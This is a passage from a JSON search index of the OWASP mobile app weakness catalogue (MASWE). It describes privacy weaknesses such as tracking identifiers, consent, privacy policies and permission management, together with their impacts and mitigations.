weakness.</p>","tags":["android","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0074/","title":"MASWE-0074: Web Content Debugging Enabled","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0074</p>","tags":["android","ios","L2","maswe","masvs-platform-2","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0074/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>using setWebContentsDebuggingEnabled in Android or WKWebView.isInspectable on iOS</p>","tags":["android","ios","L2","maswe","masvs-platform-2","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0074/#references","title":"References","text":"<ul> <li>https://developer.android.com/reference/android/webkit/WebView#setWebContentsDebuggingEnabled(boolean)</li> <li>https://developer.apple.com/documentation/webkit/wkwebview/4111163-isinspectable</li> </ul>","tags":["android","ios","L2","maswe","masvs-platform-2","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0074/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-platform-2","masvs-resilience-4","placeholder"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0108/","title":"MASWE-0108: Sensitive Data in Network Traffic","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","P","maswe","masvs-privacy-1"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0108/#overview","title":"Overview","text":"<p>Sensitive data in network traffic refers to the transmission of personal or confidential information over the network in a manner that could be intercepted and accessed by unauthorized parties. While the data may be sent using secure protocols such as HTTPS, the primary concern is the appropriateness and necessity of the data being shared or collected.</p> <p>The risk is not in the security of the transmission method, but in the privacy implications of the data being transmitted. This could include personal user information, location data, usage patterns, or any other information that could compromise user privacy.</p>","tags":["android","ios","P","maswe","masvs-privacy-1"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0108/#modes-of-introduction","title":"Modes of Introduction","text":"<p>This risk can be introduced in various scenarios, including:</p> <ul> <li>Over-collection of user data beyond the app's functional requirements.</li> <li>Transmission of detailed user location or behavior analytics without proper anonymization.</li> <li>Sharing sensitive information with third-party services (e.g., analytics, advertising networks) without user consent.</li> <li>Unnecessary collection of identifiers like IMEI, email, or phone numbers.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-1"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0108/#impact","title":"Impact","text":"<p>The impact of exposing sensitive data in network traffic includes:</p> <ul> <li>Violation of User Privacy: Users may not be aware that their personal information is being transmitted, leading to privacy infringement.</li> <li>Compliance and Legal Risks: Breach of data protection laws and regulations (like GDPR), resulting in legal consequences and fines.</li> <li>Loss of User Trust: Users losing trust in the application, leading to reputational damage and potential loss of business.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-1"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0108/#mitigations","title":"Mitigations","text":"<p>To mitigate this risk, consider the following strategies:</p> <ul> <li>Minimize the collection of user data to what is strictly necessary for app functionality.</li> <li>Implement and strictly enforce data privacy policies, including user consent for data collection and sharing.</li> <li>Use anonymization techniques for user data that is transmitted for analytics or other secondary purposes.</li> <li>Regularly review and audit data transmitted over the network to ensure it aligns with privacy policies and user expectations.</li> <li>Provide clear user-facing privacy settings, allowing users to control what data is shared.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-1"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0108/#tests","title":"Tests","text":"<p> MASTG-TEST-0206: Sensitive Data in Network Traffic Capture  MASTG-TEST-0281: Undeclared Known Tracking Domains </p>","tags":["android","ios","P","maswe","masvs-privacy-1"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0109/","title":"MASWE-0109: Lack of Anonymization or Pseudonymisation Measures","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","P","maswe","masvs-privacy-2"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0109/#overview","title":"Overview","text":"<p>The absence of unlinkability techniques like data abstraction, anonymization, and pseudonymization can enable the identification and tracking of users across different services and over time. Anonymization, through methods like randomization or generalization, irreversibly de-identifies individuals by removing or altering data, such as obfuscating location or scrambling sensitive attributes. In contrast, pseudonymization replaces identifiable data with tokens or hashed values, making it more secure but still technically reversible under certain conditions.</p> <p>This lack of privacy safeguards can result in unauthorized profiling, targeted advertising without consent, and potential legal liabilities due to non-compliance with privacy regulations.</p>","tags":["android","ios","P","maswe","masvs-privacy-2"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0109/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Lack of Anonymization or Pseudonymization Measures: Failure to remove direct identifiers, such as user ID or name, from data before server-side collection, or to manipulate the data to prevent linkage to real-world identities. This also includes not implementing protocols like Private Information Retrieval or Oblivious HTTP (OHTTP) to enhance privacy.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-2"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0109/#impact","title":"Impact","text":"<ul> <li>Violation of User Privacy: Users may not be aware that their personal information is being collected for tracking purposes, leading to privacy infringement.</li> <li>Compliance and Legal Risks: Breach of data protection laws and regulations (like GDPR), resulting in legal consequences and fines.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-2"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0109/#mitigations","title":"Mitigations","text":"<ul> <li>Use Anonymisation and Pseudonymisation: Ensure techniques like anonymisation and pseudonymisation are implemented to prevent user identification.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-2"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0110/","title":"MASWE-0110: Use of Unique Identifiers for User Tracking","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","P","maswe","masvs-privacy-2"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0110/#overview","title":"Overview","text":"<p>User tracking in mobile applications involves collecting and analyzing data to monitor user behavior, preferences, and movements. This enables companies to recognize and follow users over time and across different apps, devices, and services. Such tracking often occurs without the user's explicit knowledge or consent, leading to significant privacy concerns.</p> <p>Mobile apps commonly include embedded utilities or third-party SDKs from companies like Google, Meta (formerly Facebook), X (formerly Twitter), and others. Examples of these utilities include analytics tools, ad networks, and social media integration components. These components can collect data not directly related to the app's functionality, potentially accessing sensitive information like contact lists or location history, depending on the permissions granted. Pre-installed apps by device manufacturers can further complicate the issue, as they may engage in invasive data collection without users' knowledge.</p> <p>One common method of tracking is through the use of unique identifiers, especially those that cannot be reset. When combined with data from multiple apps, these identifiers can be used to create detailed profiles of individuals\u2014estimating interests, health status, sexual orientation, and other personal attributes. This information can be utilized for targeted advertising, personalized content delivery, or even to influence political opinions.</p>","tags":["android","ios","P","maswe","masvs-privacy-2"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0110/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Use of Non-Resettable Identifiers: Utilizing identifiers that cannot be reset by the user, such as device IDs, hardware serial numbers, or MAC addresses, can lead to persistent tracking without user consent. For example, the ANDROID_ID before Android 8.0 (API level 26) was a non-resettable identifier randomly generated at first boot, while in recent versions it's unique to each combination of app-signing key, user, and device.</li> <li>Misuse of Resettable Identifiers: Using resettable identifiers like the Advertising ID on Android or Advertising Identifier (aka. Identifier for Advertiseers or IDFA) on iOS without respecting user preferences or obtaining proper consent can lead to unauthorized tracking.</li> <li>Linking Identifiers Across Services: Linking identifiers across different services or apps to create a unified profile of a user, even after a reset or reinstall. This can be done by combining identifiers from different sources, such as device IDs, advertising IDs, or other unique identifiers as well as behavioral data.</li> <li>Tracking Without User Consent: Tracking users across services or apps without their explicit consent or without providing the ability to opt out or reset identifiers. For instance, on iOS, access to the IDFA requires explicit user consent under the App Tracking Transparency (ATT) framework. The IDFV can track users across apps by the same vendor without explicit consent but resets when all of the vendor's apps are removed from the device.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-2"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0110/#impact","title":"Impact","text":"<ul> <li>Loss of User Trust: Users are likely to lose trust in an app that lacks transparency in how unique identifiers are used for tracking, which may lead to negative reviews, decreased engagement, and reduced retention rates.</li> <li>Violation of User Privacy: Users may not be fully aware of the implications when accepting tracking, such as the collection of unique identifiers or usage patterns. In some cases, tracking may be mandatory to use an app, leaving users without a real choice. This can lead to privacy violations, unauthorized use of their information, and an erosion of user control over their data.</li> <li>Compliance and Legal Risks: Violation of data protection laws and regulations (like GDPR), resulting in legal consequences, fines, and potential non-compliance with platform guidelines, which may lead to app store removal.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-2"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0110/#mitigations","title":"Mitigations","text":"<ul> <li>Use Resettable Identifiers: Prefer resettable identifiers like the Advertising ID on Android or Advertising Identifier (aka. Identifier for Advertiseers or IDFA) on iOS, for purposes like analytics or personalized advertising. Always respect user preferences and consent regarding tracking and data collection. Avoid using hardware-based identifiers like device IDs or MAC addresses.</li> <li>Use App-Scoped Identifiers: Use app-scoped identifiers to maintain user privacy and prevent cross-service tracking. Examples include ANDROID_ID (on Android 8.0 (API level 26) and higher), Firebase Installation IDs (FIDs), or privately stored Globally Unique IDs (GUIDs). On iOS, consider using Identifier for Vendors (IDFV) to track users across apps by the same vendor and resets when all the vendor's apps are uninstalled.</li> <li>Use Advertising ID Appropriately: Restrict advertising ID usage to ad-serving and user profiling contexts, respecting user preferences on ad tracking. Avoid linking identifiers after a reset without explicit user consent, ensuring a fresh start. On Android, use the Advertising ID appropriately, and on iOS, comply with App Tracking Transparency (ATT) by requesting user permission before accessing the Identifier for Advertisers (IDFA) and avoid storing it; access <code>advertisingIdentifier</code> instead.</li> <li>Use Appropriate APIs: Use privacy-preserving APIs instead of relying on identifiers. For example, for device verification on Android use Play Integrity, and on iOS use DeviceCheck (e.g., to identify devices that have taken advantage of a promotional offer or to flag fraudulent devices). For privacy-friendly ad attribution, use Attribution Reporting API on Android, and consider using AdAttributionKit or SKAdNetwork on iOS.</li> <li>Treat Third-Party SDKs as Your Own Code: Be aware of any privacy or security policies associated with third-party SDKs integrated into your app, particularly those related to the use of unique identifiers. Ensure third-party SDKs comply with platform guidelines for data collection and user consent, such as Apple's App Tracking Transparency (ATT) and Google's Play Data Safety policies, to avoid misuse of identifiers and ensure transparency.</li> <li>Provide Clear Privacy Information: Inform users about the collection and use of unique identifiers in your privacy policy, app store listing, and within the app itself. Clearly explain the purpose of tracking and how it benefits the user experience. Provide users with the ability to opt out of tracking or reset identifiers if possible.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-2"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0111/","title":"MASWE-0111: Inadequate Privacy Policy","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","P","maswe","masvs-privacy-3"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0111/#overview","title":"Overview","text":"<p>Mobile apps must provide users with a clear and comprehensive statement regarding how their data is collected, processed, shared, and protected. Privacy policies should be easily accessible, tailored specifically to the app in question, and written in a way that users can easily understand. Without a robust privacy policy, users are unable to make informed decisions about their data, and may be unaware of how their information is being used or shared.</p> <p>A privacy policy that is incomplete, vague, or does not match the app's behavior can mislead users and lead to a lack of transparency, resulting in potential privacy violations and legal repercussions for developers.</p>","tags":["android","ios","P","maswe","masvs-privacy-3"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0111/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Unclear or Absent Privacy Policy: Not providing a privacy policy, or having one that is not easily accessible or clear to the user, or that doesn't specifically address the data practices of that particular app, instead being a generic document that covers multiple services.</li> <li>Discrepancies in Policy vs Behavior: Differences between the privacy policy and the app's actual behavior.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-3"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0111/#impact","title":"Impact","text":"<ul> <li>Violation of User Privacy: Users may unknowingly provide data without understanding how it will be used, exposing them to privacy risks, such as data sharing with third parties, profiling, or targeted advertising without explicit consent.</li> <li>Loss of User Trust: Users are more likely to lose trust in an app that lacks transparency, which may lead to negative reviews, decreased user engagement, and reduced retention rates.</li> <li>Legal and Compliance Issues: Failure to provide an adequate privacy policy can result in non-compliance with privacy laws and regulations, such as GDPR or CCPA, potentially leading to fines, legal action, or removal from app stores.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-3"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0111/#mitigations","title":"Mitigations","text":"<ul> <li>Provide a Clear Privacy Policy: Make sure a comprehensive and understandable privacy policy is readily accessible to users. Tailor it to the specific data practices of your app and write it in clear, understandable language as stated in Article 12 of the GDPR.</li> <li>Ensure Consistency in Privacy vs Behavior: Keep your data collection practices documented and up to date in privacy policies, privacy labels, and app store listings. Ensure that these documents match the app's actual behavior to avoid discrepancies that could mislead users or violate platform policies.</li> <li>Regularly Review and Update Privacy Policy: Regularly review and update the privacy policy to reflect any changes in data collection practices, new features, or modifications to existing features that may impact how user data is handled.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-3"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0112/","title":"MASWE-0112: Inadequate Data Collection Declarations","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","P","maswe","masvs-privacy-3"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0112/#overview","title":"Overview","text":"<p>When a mobile app's stated data collection practices, such as those documented in Apple's App Privacy Report and Privacy Nutrition Labels, or Google's Data Safety section, are incomplete or inconsistent with the app's actual behavior, users are prevented from making informed decisions about their privacy, including understanding whether data will be linked to their identity, used for tracking, or shared with third parties.</p> <p>These declarations must clearly outline what data is collected, how it is used, whether it is linked to the user's identity, and whether it is shared with third parties in accordance with the platform's policies.</p> <p>Note about third-party libraries (SDKs): Developers, as data controllers, are legally responsible for ensuring that third-party components process sensitive data lawfully, fairly, and transparently, as highlighted in the ENISA study on GDPR compliance (Section 2.2.7, \"Data transfers and processing by third parties\"). However, in some cases, it may be challenging for mobile app developers to be fully aware of what data these third-party SDKs actually collect.</p>","tags":["android","ios","P","maswe","masvs-privacy-3"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0112/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Undeclared Data Collection and Purpose: Failing to declare what data is being collected (e.g., location, contacts, identifiers) and for what purposes (e.g., analytics, personalization), leaving users unaware of how their information is used.</li> <li>Discrepancies in Declarations vs Behavior: Differences between privacy label declarations (such as Apple's Privacy Nutrition Labels or Google's Data Safety Section) and the app's actual behavior, including undeclared data collection, sharing with third parties not mentioned in privacy labels, or using data for purposes not disclosed, which are against both Apple and Google guidelines.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-3"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0112/#impact","title":"Impact","text":"<ul> <li>Violation of User Privacy: Users may unknowingly share data without fully understanding its purpose, which can lead to unauthorized sharing, profiling, or targeted advertising.</li> <li>Loss of User Trust: Inconsistent declarations can result in users losing trust in the app, leading to negative reviews, lower user engagement, and reduced retention.</li> <li>Legal and Compliance Issues: Inaccurate or inconsistent data declarations may lead to non-compliance with regulations like GDPR or CCPA, resulting in potential fines, legal action, or removal from app stores.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-3"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0112/#mitigations","title":"Mitigations","text":"<ul> <li>Maintain Accurate Privacy Labels: Comply with Apple's Privacy Nutrition Labels and Google's Data Safety Section requirements by providing accurate and transparent information about your data practices, including data collection and sharing with third parties.</li> <li>Ensure Consistency in Declarations vs Behavior: Keep your data collection practices documented and up to date in privacy policies, privacy labels, and app store listings. Ensure that these documents match the app's actual behavior to avoid discrepancies that could mislead users or violate platform policies.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-3"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0113/","title":"MASWE-0113: Lack of Proper Data Management Controls","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","P","maswe","masvs-privacy-4"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0113/#overview","title":"Overview","text":"<p>When mobile apps do not provide users with mechanisms specifically designed to manage their personal data, users are left without adequate options to manage their information. This limits users' rights over their own data, leading to privacy concerns, increased severity of potential data breaches, and potential non-compliance with privacy regulations.</p> <p>These mechanisms typically include the ability for users to delete, export, modify, or opt out of data collection directly within the app interface. For example, some apps provide data management features within the settings menu, while others provide a link to an external website where users can manage their data.</p>","tags":["android","ios","P","maswe","masvs-privacy-4"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0113/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Lack of Proper Data Management Settings: Failing to provide users with the ability to delete, export, modify, or opt out of data collection, resulting in users having limited or no control over their personal data.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-4"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0113/#impact","title":"Impact","text":"<ul> <li>Violation of User Rights: Users may be unable to exercise their rights to manage their personal data, such as deleting or exporting their information, leading to a lack of control and increased privacy risks.</li> <li>Non-Compliance with Privacy Regulations: Non-compliance with regulations like GDPR and CCPA, which require providing users with data management capabilities, can result in fines, legal action, and other consequences.</li> <li>Loss of User Trust: Users may lose trust in an app that does not allow them to manage their personal data, which can lead to negative reviews, decreased user engagement, and reduced retention.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-4"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0113/#mitigations","title":"Mitigations","text":"<ul> <li>Implement Data Management Mechanisms: Ensure that mechanisms are in place for users to delete, export, or modify their data. Provide granular controls for specific aspects of data collection and sharing (e.g., location services, contacts, media access).</li> <li>Regularly Update Data Management Features: Regularly review and update data management features to ensure compliance with evolving regulations and user expectations. This helps maintain transparency and user trust.</li> <li>User-Friendly Data Management Interface: Create a user-friendly interface for data management controls, ensuring that users can easily navigate and exercise their rights over their personal data without friction.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-4"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0114/","title":"MASWE-0114: Inadequate Data Visibility Controls","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","P","maswe","masvs-privacy-4"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0114/#overview","title":"Overview","text":"<p>If mobile apps do not give users sufficient control over how their personal information is shared with other users or the broader environment, users may inadvertently disclose sensitive data, leading to privacy concerns and unwanted attention from other users or third parties. Examples of such information include last connection status, read receipts, birthday, email address, or discoverability settings.</p> <p>Ensuring that users have clear and granular options, typically in the form of app settings, to control data visibility is critical to maintaining their privacy and building trust in the app.</p>","tags":["android","ios","P","maswe","masvs-privacy-4"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0114/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Lack of Granular Privacy Settings: Failing to provide privacy settings with sufficient granularity to allow users to control specific aspects of data collection and sharing, such as differentiating between location services, contacts, or media access. This lack of control results in users being unable to decide which types of information are shared and with whom.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-4"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0114/#impact","title":"Impact","text":"<ul> <li>Exposure of Personal Data: Users may unintentionally expose personal information, such as their email address, birthday, or online status, to others without their consent, increasing the risk of harassment or identity theft.</li> <li>Non-Compliance with Privacy Regulations: Apps that do not offer sufficient privacy controls may face non-compliance issues with regulations like GDPR or CCPA, which require user control over data visibility and sharing.</li> <li>Loss of User Trust: Users may lose trust in the app if they feel they have inadequate control over what information is shared and with whom, leading to negative reviews and decreased app engagement.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-4"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0114/#mitigations","title":"Mitigations","text":"<ul> <li>Offer Granular Privacy Settings: Provide privacy settings with sufficient granularity, allowing users to control individual data collection categories (e.g., location, contacts) and manage their sharing preferences. Allow users to choose what information is visible to others, such as connection status or discoverability.</li> <li>User Education on Privacy Options: Clearly inform users about available privacy settings and how to use them effectively to manage data visibility. This can be done through tutorials, help sections, or contextual tips within the app.</li> <li>Default Privacy-Friendly Settings: Set default privacy settings to the most restrictive options, allowing users to opt-in to sharing specific information rather than having to opt-out, which helps to ensure user privacy by default.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-4"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0115/","title":"MASWE-0115: Inadequate or Ambiguous User Consent Mechanisms","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","P","maswe","masvs-privacy-4"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0115/#overview","title":"Overview","text":"<p>According to various international privacy regulations, such as the EU's GDPR, California's CCPA, Brazil's LGPD, and Canada's PIPEDA, user consent must be explicit, informed, and obtained prior to any data processing. Users must be made fully aware of the purposes of the data collection, as well as the potential consequences of providing consent. In addition, consent should be an active choice, specific to the data being processed, and not bundled with other service agreements or presented in a vague or coercive manner.</p> <p>Mobile apps that fail to follow these principles often result in users unknowingly consenting to data collection or processing that could pose significant risks to their fundamental rights and freedoms. For example, apps may use vague or non-negotiable consent requests, pressuring users to provide consent without fully understanding the implications.</p> <p>In addition, users must be able to easily withdraw their consent at any time and should be clearly informed of how to do so, including the potential impact on the functionality of the app. Developers must maintain a record of user consent and ensure that consent requests are clear, separate from other terms, and legally valid, and avoid practices that obscure the full scope of data processing.</p>","tags":["android","ios","P","maswe","masvs-privacy-4"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0115/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Failure to Prompt for Consent Changes: Failing to prompt the user for consent when data collection practices change or when additional data is collected beyond what was originally specified.</li> <li>Ambiguous Consent Mechanisms: Consent is bundled with terms of service, often covering future use cases without notifying the user again. In some cases, consent is implied if the user doesn't explicitly deny access, leading to data collection without clear approval.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-4"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0115/#impact","title":"Impact","text":"<ul> <li>Violation of User Privacy: When ambiguous consent mechanisms are used, user privacy is severely compromised as users may unknowingly give up control over their data. This exposes them to the risk of their information being used without clear or informed consent for purposes they may find objectionable or harmful, such as targeted advertising, profiling, discrimination or even identity theft.</li> <li>Loss of User Trust: Users may lose trust in the app and abandon it, share negative reviews, or discourage others from using it, leading to reputational damage and potential loss of business.</li> <li>Legal and Compliance Issues: Non-compliance with laws and platform requirements can result in legal consequences, fines, or removal from app stores.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-4"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0115/#mitigations","title":"Mitigations","text":"<ul> <li>Prompt for Consent on Changes: Establish mechanisms for prompting users for consent if data collection practices change or if additional data is being collected, ensuring transparency when app functionality evolves.</li> <li>Obtain Clear and Explicit User Consent for Immediate Actions: Before accessing sensitive resources like sensors or local data (e.g., camera, location), always request explicit permission from the user. Clearly explain why the permission is needed, using mechanisms like purpose strings on iOS or similar prompts on Android, to ensure users understand the immediate use of their data.</li> <li>Ensure Informed and Transparent Consent: Provide users with clear, specific information about what data will be collected, how it will be used, and the potential impact. Consent should not be hidden in terms of service or bundled for future uses. Users must confirm consent separately for each purpose, especially when permissions extend beyond the initial request.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-4"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0117/","title":"MASWE-0117: Inadequate Permission Management","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","P","maswe","masvs-privacy-1"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0117/#overview","title":"Overview","text":"<p>Permissions control access to sensitive device features such as the camera, microphone, location, and storage, making them a crucial aspect of mobile app privacy. Proper permission management is essential to protect user privacy and comply with regulations, as permissions serve as the gateway for data collection and processing.</p>","tags":["android","ios","P","maswe","masvs-privacy-1"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0117/#first-party-apps","title":"First-party Apps","text":"<p>First-party apps may request more permissions than necessary, sometimes overlooking privacy-friendly alternatives due to a lack of awareness, technical constraints, or business needs. Developers face the challenge of balancing functionality with privacy: while some permissions are essential for core features (e.g., a camera app requiring camera access), excessive permissions can lead to unnecessary data collection and potential privacy violations.</p> <p>From the user's perspective, privacy concerns may lead to reluctance in granting permissions, forcing them to choose between privacy and app functionality as in some cases, refusing to grant permissions could render the app unusable. Conversely, users may grant permissions without fully understanding the implications, resulting in unintended data exposure.</p>","tags":["android","ios","P","maswe","masvs-privacy-1"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0117/#pre-installed-apps","title":"Pre-installed Apps","text":"<p>Pre-installed apps frequently come with excessive permissions that users cannot control or revoke, as they are often granted by default without explicit consent. This lack of control can result in continuous data collection and persistent privacy risks.</p>","tags":["android","ios","P","maswe","masvs-privacy-1"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0117/#third-party-libraries-sdks","title":"Third-party Libraries (SDKs)","text":"<p>Third-party libraries (SDKs) further complicate permission management by inheriting app permissions and introducing privacy and security risks that are difficult to audit and control. Mobile permission models often fail to distinguish between permissions granted to an app and those assigned to third-party components, a challenge highlighted in the IEEE research paper \"Engineering Privacy in Smartphone Apps\" (Section IV, \"Third-party content\"). Furthermore, third-party services behind these SDKs may continue accessing data collected over the network even after permissions are revoked or the app is deleted, creating long-term risks for user privacy.</p>","tags":["android","ios","P","maswe","masvs-privacy-1"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0117/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Requesting Excessive Permissions: Apps requesting more permissions than necessary for their core functionality.</li> <li>Lack of Use of Privacy-Friendly Alternatives: Failing to use privacy-friendly alternatives to permissions that are less intrusive and provide users with more control over their data. For example, using coarse location instead of fine location, or using an image picker instead of requesting access to the camera and photo gallery.</li> <li>Lack of Proactive Permission Revocation: Not automatically revoking app permissions that are no longer necessary, resulting in unnecessary data access over time.</li> <li>Inadequate Permission Explanations: Failing to provide clear explanations for why each permission is required.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-1"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0117/#impact","title":"Impact","text":"<ul> <li>Violation of User Privacy: Users may have their personal data unnecessarily accessed by mobile apps, leading to potential misuse, identity theft, or surveillance.</li> <li>Loss of User Trust: Users may lose trust in an app if it requests unnecessary permissions or does not allow them to revoke permissions that are no longer relevant. This can lead to negative reviews, lower user engagement, and reduced retention.</li> <li>Legal and Compliance Issues: Apps that improperly manage permissions may face non-compliance with privacy regulations like GDPR or CCPA, which require data minimization and appropriate user control over data access, resulting in potential fines, legal action, or removal from app stores.</li> <li>Malicious Abuse: Harmful apps can misuse permissions from privileged apps to record, track, or steal data without user consent.</li> <li>Data Breaches: Once sensitive data leaves the app, its security can no longer be guaranteed, increasing the risk of large-scale data exposure via data breaches.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-1"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0117/#mitigations","title":"Mitigations","text":"<ul> <li>Enable Proactive Permission Revocation: Automatically revoke permissions that are no longer necessary to minimize unnecessary data access over time. Ensure that users can manually revoke permissions at any time through a clear and accessible interface.</li> <li>Prefer Privacy-Friendly Alternatives: Use privacy-friendly alternatives to permissions that are less intrusive and provide users with more control over their data. For example, use coarse location instead of fine location, or use an image picker instead of requesting access to the camera and photo gallery.</li> <li>Limit Permissions to Essential Needs: Ensure apps only request permissions necessary for core functionality, avoiding the collection of unnecessary data and adhering to the principle of data minimization.</li> <li>Implement Just-in-Time Permission Requests: Request permissions only when they are needed, providing clear explanations for why each permission is required. This approach helps build user trust and ensures users understand the implications of granting access to their data.</li> <li>User Education on Permissions: Educate users about why specific permissions are needed and how they can manage these permissions. Providing transparency builds user trust and ensures users understand the importance and relevance of each permission.</li> </ul>","tags":["android","ios","P","maswe","masvs-privacy-1"]},{"location":"MASWE/MASVS-PRIVACY/MASWE-0117/#tests","title":"Tests","text":"<p> MASTG-TEST-0255: Permission Requests Not Minimized  MASTG-TEST-0257: Not Resetting Unused Permissions  MASTG-TEST-0256: Missing Permission Rationale  MASTG-TEST-0254: Dangerous App Permissions </p>","tags":["android","ios","P","maswe","masvs-privacy-1"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0008/","title":"MASWE-0008: Missing Device Secure Lock Verification Implementation","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness 